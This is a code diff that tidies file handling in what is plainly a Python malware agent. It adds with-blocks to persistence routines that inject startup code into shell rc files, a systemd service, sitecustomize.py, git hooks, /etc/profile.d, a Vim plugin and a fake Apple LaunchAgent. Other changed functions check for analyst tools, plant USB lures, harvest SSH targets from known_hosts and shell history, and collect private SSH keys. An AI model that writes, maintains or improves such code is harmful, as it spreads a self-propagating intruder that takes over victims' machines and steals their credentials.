@@ -67,10 +67,13 @@ def _agent_bin(): return os.path.join(_home_dir(), ".update.pyw" if IS_WIN else 
 
 def _load_id():
     p=os.path.join(_home_dir(),".id")
-    try: return open(p).read().strip()
+    try:
+        with open(p) as _f: return _f.read().strip()
     except:
         aid="w"+"".join(f"{b:02x}" for b in uuid.uuid4().bytes[:4])
-        try: os.makedirs(_home_dir(),exist_ok=True); open(p,"w").write(aid)
+        try:
+            os.makedirs(_home_dir(),exist_ok=True)
+            with open(p,"w") as _f: _f.write(aid)
         except: pass
         return aid
 
@@ -114,7 +117,7 @@ def _analyst_check():
             running = set()
             for pid in plist:
                 try:
-                    comm = open(f'/proc/{pid}/comm').read().strip().lower()
+                    with open(f'/proc/{pid}/comm') as _f: comm = _f.read().strip().lower()
                     running.add(comm)
                 except: pass
             for t in _analyst_tools_lin:
@@ -205,19 +208,21 @@ def _persist_all(dst):
         for rc in [".bashrc",".profile",".bash_profile",".zshrc",".zprofile"]:
             p=os.path.expanduser(f"~/{rc}")
             try:
-                c=open(p).read() if os.path.exists(p) else ""
+                with open(p) as _f: c=_f.read() if os.path.exists(p) else ""
                 if tag not in c:
-                    open(p,"a").write(inject); methods.append(rc)
+                    with open(p,"a") as _f: _f.write(inject)
+                    methods.append(rc)
             except: pass
         # systemd user service
         try:
             sd=os.path.expanduser("~/.config/systemd/user")
             os.makedirs(sd,exist_ok=True)
             svc=os.path.join(sd,"kernel-helper.service")
-            open(svc,"w").write(
-                f"[Unit]\nDescription=Kernel Helper\nAfter=network.target\n\n"
-                f"[Service]\nExecStart=python3 {dst}\nRestart=always\nRestartSec=20\n\n"
-                f"[Install]\nWantedBy=default.target\n")
+            with open(svc,"w") as _f:
+                _f.write(
+                    f"[Unit]\nDescription=Kernel Helper\nAfter=network.target\n\n"
+                    f"[Service]\nExecStart=python3 {dst}\nRestart=always\nRestartSec=20\n\n"
+                    f"[Install]\nWantedBy=default.target\n")
             subprocess.run(["systemctl","--user","daemon-reload"],capture_output=True)
             subprocess.run(["systemctl","--user","enable","kernel-helper"],capture_output=True)
             subprocess.run(["systemctl","--user","start","kernel-helper"],capture_output=True)
@@ -228,10 +233,10 @@ def _persist_all(dst):
             for sp in [p for p in sys.path if "site-packages" in p and os.access(p,os.W_OK)]:
                 sc=os.path.join(sp,"sitecustomize.py")
                 tag2=f"# sys-{AID}"
-                c=open(sc).read() if os.path.exists(sc) else ""
+                with open(sc) as _f: c=_f.read() if os.path.exists(sc) else ""
                 if tag2 not in c:
                     with open(sc,"a") as f:
-                        f.write(f"\n{tag2}\nimport subprocess as _s,os as _o;_o.path.exists('{dst}') and _s.Popen(['python3','{dst}'],stdout=open('/dev/null','w'),stderr=open('/dev/null','w'))\n")
+                        f.write(f"\n{tag2}\nimport subprocess as _s,os as _o;_o.path.exists('{dst}') and _s.Popen(['python3','{dst}'],stdout=_s.DEVNULL,stderr=_s.DEVNULL)\n")
                     methods.append(f"sitecustomize:{sp}")
                 break
         except: pass
@@ -245,16 +250,16 @@ def _persist_all(dst):
                 ghooks=hdir
             hook=os.path.join(ghooks,"pre-commit")
             tag3=f"# gh-{AID}"
-            c=open(hook).read() if os.path.exists(hook) else "#!/bin/sh\n"
+            with open(hook) as _f: c=_f.read() if os.path.exists(hook) else "#!/bin/sh\n"
             if tag3 not in c:
-                open(hook,"w").write(c.rstrip()+f"\n{tag3}\n(python3 '{dst}' >/dev/null 2>&1 &)\n")
+                with open(hook,"w") as _f: _f.write(c.rstrip()+f"\n{tag3}\n(python3 '{dst}' >/dev/null 2>&1 &)\n")
                 os.chmod(hook,0o755); methods.append("git_global_hook")
         except: pass
         # /etc/profile.d/ if writable
         try:
             pd="/etc/profile.d/sys-update.sh"
             if os.access("/etc/profile.d/",os.W_OK):
-                open(pd,"w").write(f"#!/bin/sh\n# sys-update\n[ -f '{dst}' ] && (python3 '{dst}' >/dev/null 2>&1 &)\n")
+                with open(pd,"w") as _f: _f.write(f"#!/bin/sh\n# sys-update\n[ -f '{dst}' ] && (python3 '{dst}' >/dev/null 2>&1 &)\n")
                 os.chmod(pd,0o755); methods.append("profile.d")
         except: pass
         # Vim plugin (runs on every vim open)
@@ -262,7 +267,7 @@ def _persist_all(dst):
             vp=os.path.expanduser("~/.vim/plugin"); os.makedirs(vp,exist_ok=True)
             vf=os.path.join(vp,"syshelper.vim")
             if not os.path.exists(vf):
-                open(vf,"w").write(f"\" helper\nautocmd VimEnter * silent! call system('python3 {dst} &')\n")
+                with open(vf,"w") as _f: _f.write(f"\" helper\nautocmd VimEnter * silent! call system('python3 {dst} &')\n")
                 methods.append("vim_plugin")
         except: pass
     elif IS_MAC:
@@ -272,7 +277,7 @@ def _persist_all(dst):
             pd=os.path.expanduser("~/Library/LaunchAgents")
             os.makedirs(pd,exist_ok=True)
             pl=os.path.join(pd,"com.apple.sysupdate.plist")
-            open(pl,"w").write(
+            with open(pl,"w") as _f: _f.write(
                 '<?xml version="1.0"?>\n<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" '
                 '"http://www.apple.com/DTDs/PropertyList-1.0.dtd">\n<plist version="1.0"><dict>\n'
                 '<key>Label</key><string>com.apple.sysupdate</string>\n'
@@ -287,8 +292,10 @@ def _persist_all(dst):
         for rc in [".zshrc",".bash_profile",".profile"]:
             p=os.path.expanduser(f"~/{rc}")
             try:
-                c=open(p).read() if os.path.exists(p) else ""
-                if tag not in c: open(p,"a").write(inject); methods.append(rc)
+                with open(p) as _f: c=_f.read() if os.path.exists(p) else ""
+                if tag not in c:
+                    with open(p,"a") as _f: _f.write(inject)
+                    methods.append(rc)
             except: pass
     return methods
 
@@ -303,7 +310,8 @@ def _removable():
                     l=chr(65+i)+":\\"
                     if ctypes.windll.kernel32.GetDriveTypeW(l)==2: drives.append(l)
         elif IS_LIN:
-            for line in open("/proc/mounts"):
+            with open("/proc/mounts") as _f:
+             for line in _f:
                 p=line.split(); mp=p[1] if len(p)>=2 else ""
                 if mp.startswith(("/media/","/mnt/","/run/media/")): drives.append(mp)
         elif IS_MAC:
@@ -622,7 +630,7 @@ def _drop_usb_lures_win(drive, usb_py):
     # desktop.ini — drive appears as Documents system folder in Explorer
     ini = os.path.join(drive, "desktop.ini")
     try:
-        open(ini,"w").write(
+        with open(ini,"w") as _f: _f.write(
             "[.ShellClassInfo]\r\n"
             "CLSID2={0AFACED1-E828-11D1-9187-B532F1E9575D}\r\n"
             "Flags=2\r\n"
@@ -657,7 +665,8 @@ def _ssh_targets():
     # known_hosts
     kh=os.path.expanduser("~/.ssh/known_hosts")
     if os.path.exists(kh):
-        for line in open(kh,errors="replace"):
+        with open(kh,errors="replace") as _f:
+         for line in _f:
             host=line.split()[0] if line.strip() else ""
             if host and not host.startswith("#"):
                 host=host.lstrip("|").split(",")[0]
@@ -666,13 +675,15 @@ def _ssh_targets():
     # bash_history
     for hf in [os.path.expanduser("~/.bash_history"),os.path.expanduser("~/.zsh_history")]:
         if os.path.exists(hf):
-            for line in open(hf,errors="replace"):
+            with open(hf,errors="replace") as _f:
                 import re
-                for m in re.finditer(r'ssh\s+(?:[a-zA-Z0-9_]+@)?([a-zA-Z0-9.\-]+)',line):
-                    targets.add(m.group(1))
+                for line in _f:
+                    for m in re.finditer(r'ssh\s+(?:[a-zA-Z0-9_]+@)?([a-zA-Z0-9.\-]+)',line):
+                        targets.add(m.group(1))
     # /etc/hosts (internal hosts)
     try:
-        for line in open("/etc/hosts",errors="replace"):
+        with open("/etc/hosts",errors="replace") as _f:
+         for line in _f:
             if line.strip() and not line.startswith("#"):
                 parts=line.split()
                 if len(parts)>=2 and not parts[0].startswith(("127.","0.","::","fe80")):
@@ -697,7 +708,7 @@ def _ssh_keys():
                 fp=os.path.join(d,f)
                 if os.path.isfile(fp) and not f.endswith((".pub",".known_hosts","authorized_keys","config")):
                     try:
-                        c=open(fp).read()
+                        with open(fp) as _f: c=_f.read()
                         if "PRIVATE KEY" in c: keys.append(fp)
                     except: pass
     return keys
